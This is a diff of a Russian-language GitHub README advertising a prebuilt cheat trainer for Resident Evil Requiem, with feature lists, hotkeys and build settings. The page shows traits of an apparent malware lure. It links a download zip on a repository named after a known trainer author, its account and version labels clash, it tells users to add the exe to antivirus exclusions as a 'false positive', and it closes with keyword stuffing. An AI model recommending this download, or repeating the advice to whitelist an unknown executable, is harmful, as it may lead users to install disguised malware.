@@ -1,33 +1,108 @@
-[![GitHub release](https://img.shields.io/github/v/release/ModEngineLabs/resident-evil-requiem-sourse?color=green&label=Latest%20v1.0.6)](https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip)
-  [![GitHub stars](https://img.shields.io/github/stars/ModEngineLabs/resident-evil-requiem-sourse?style=social)](https://github.com/ModEngineLabs/resident-evil-requiem-sourse/stargazers)
-  [![License](https://img.shields.io/badge/License-Educational-blue)](LICENSE)
-  [![Platform](https://img.shields.io/badge/Platform-Windows%20x64-orange)](https://github.com/ModEngineLabs/resident-evil-requiem-sourse)
-  [![Build](https://img.shields.io/badge/build-v1.0.7-success)](https://github.com/ModEngineLabs/resident-evil-requiem-Trainer-sourse/releases/latest)
+<div align="center">
+  <img src="https://github.com/user-attachments/assets/61b3da88-6f92-43fb-8840-942a7eb6df91" width="420" alt="Resident Evil Requiem Trainer Interface"/>
+  <br><br>
+  
+  <h1>Resident Evil Requiem Trainer v1.0.7</h1>
+  
+  <h3>Профессиональный трейнер для RE9 (Requiem) с 15+ читами</h3>
+  
+  <p>
+    <a href="https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/latest">
+      <img src="https://img.shields.io/github/v/release/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock?color=brightgreen&label=Latest%20Release&logo=windows&logoColor=white&style=for-the-badge" alt="Latest Release">
+    </a>
+    <a href="https://github.com/ModEngineLabs/resident-evil-requiem-sourse/stargazers">
+      <img src="https://img.shields.io/github/stars/ModEngineLabs/resident-evil-requiem-sourse?style=for-the-badge&logo=starship&color=yellow" alt="Stars">
+    </a>
+    <img src="https://img.shields.io/badge/Platform-Windows%20x64-orange?style=for-the-badge&logo=windows" alt="Windows x64">
+    <img src="https://img.shields.io/badge/License-Educational-blue?style=for-the-badge" alt="Educational License">
+  </p>
 
-  <h1>Resident Evil Requiem Trainer </h1>
-  <h3>Профессиональный трейнер для Resident Evil Requiem (RE9 / Biohazard Requiem) – God Mode, Infinite Ammo, No Reload, Infinite Health и 15+ читов</h3>
+  <br>
 
-  <p><strong>Только оффлайн / single-player режим!</strong> Использование в RE.Net, Mercenaries или любых онлайн-элементах → высокий риск бана.</p>
+  <p><strong>Только оффлайн / single-player!</strong> Любое использование в онлайн-режимах (RE.Net, Mercenaries и т.д.) — высокий риск бана.</p>
+  <p><strong>Поддерживаемая версия игры:</strong> v1.7 (Steam AppID 3764200) • патч марта 2026</p>
 
-  <p><strong>Текущая версия игры:</strong> v1.7 (Steam AppID 3764200) • Патч launch day 12.03.2026</p>
+  <br>
 
   <a href="https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip">
-    <img src="https://img.shields.io/badge/Download%20v1.0.6%20Ready%20EXE-2E7D32?style=for-the-badge&logo=windows&logoColor=white" alt="Download v1.0.7"/>
+    <img src="https://img.shields.io/badge/СКАЧАТЬ%20v1.0.7-2E7D32?style=for-the-badge&logo=windows&logoColor=white&labelColor=1B5E20" alt="Скачать v1.0.7">
   </a>
+
+  <br><br>
+
+  <img src="https://github.com/user-attachments/assets/4da09696-b74f-4b12-9bf6-e757d3dbb528" width="520" alt="Trainer in action"/>
 
 </div>
 
-<img width="444" height="750" alt="image" src="https://github.com/user-attachments/assets/61b3da88-6f92-43fb-8840-942a7eb6df91" />
+---
 
+## Основные возможности
 
-# Professional Game Trainer for Resident Evil Requiem (RE9) V 1.0.7
-- Updated for the current game patch 05.03.2026
-- Обновлено под актуальный патч игры 05.03.2026
-- Компилирования версия - https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip
-- Compiling version - https://github.com/Kekwreck/Resident-Evil-Requiem-Trainer-29-by-FLiNG-Health-Ammo-CP-Speed-Editor-Extra-Content-Unlock/releases/download/1.0.7/RERequiem_Trainer_v1.0.7.zip
+- God Mode / Ignore Hits  
+- Infinite Health  
+- Infinite Ammo / No Reload  
+- Infinite Items & Grenades  
+- Infinite Knife Durability  
+- One Hit Kill  
+- Freeze Enemies  
+- Super Speed / Super Jump  
+- No Recoil / No Spread  
+- Game Speed Control  
+- Infinite Money / CP Editor  
+- Unlock Special Content  
+- Reset Save Count  
+- Полностью автономный .exe (статическая сборка)  
+- Красивый оверлей на ImGui + DX11  
+- Автоопределение процесса игры  
+- Горячие клавиши в фоне  
+- Always on top + полупрозрачность + drag & drop  
 
-<img width="448" height="646" alt="image" src="https://github.com/user-attachments/assets/4da09696-b74f-4b12-9bf6-e757d3dbb528" />
+## Горячие клавиши
 
+| Клавиша     | Действие                          |
+|-------------|-----------------------------------|
+| Num *       | Вкл/выкл все читы разом           |
+| Num 1–9     | Читы 1–9                          |
+| F1–F6       | Читы 10–15                        |
+| ESC         | Закрыть окно трейнера             |
+
+## Как использовать
+
+1. Запусти игру  
+2. Запусти `RERequiem_Trainer_v1.0.7.exe`  
+3. Трейнер автоматически найдёт процесс `ResidentEvilRequiem.exe`  
+4. Используй NumPad / F-клавиши для активации читов  
+
+**Важно:**  
+- Работает **только в одиночной игре**  
+- Антивирус может ругаться (false positive) — добавь в исключения  
+- При выходе новых патчей offsets могут сломаться (обновления будут выходить)
+
+## Сборка из исходников (для разработчиков)
+
+### Требования
+- Visual Studio 2019 / 2022 (x64)  
+- Windows SDK 10.0+  
+- Dear ImGui (последняя версия)
+
+### Установка ImGui
+1. Скачай: https://github.com/ocornut/imgui/releases/latest  
+2. Скопируй основные файлы + backends/win32 + dx11
+
+### Рекомендуемые настройки проекта (Release x64)
+- Runtime: `/MT`  
+- Optimization: `/O1 /Os /GL`  
+- Exceptions / RTTI: выключены  
+- Security Check: `/GS-`  
+- SubSystem: Windows  
+- Entry: `mainCRTStartup`  
+- Debug Info: No  
+- LTCG: Yes
+
+### После сборки (сильно уменьшить размер)
+```bash
+strip trainer.exe
+upx --best --lzma trainer.exe
 
 ## Описание
 Профессиональный game trainer для Resident Evil Requiem с поддержкой 15 модификаций и реальным определением процесса игры.
@@ -332,6 +407,7 @@ re9 trainer v1.0 steam
 resident evil requiem fearless revolution  
 
 resident-evil-requiem, resident-evil-requiem-cheats, re9-trainer, requiem-fling, fling-trainer-requiem, god-mode-re9, infinite-health-re9, infinite-ammo-re9, no-recoil-re9, rapid-fire-re9, super-accuracy-requiem, infinite-grenades-re9, weapon-durability-re9, highlight-interactables-requiem, super-damage-re9, one-hit-kill-re9, unlock-extras-requiem, edit-cp-re9, pc-cheats-requiem, survival-horror-trainer
+
 
 
 
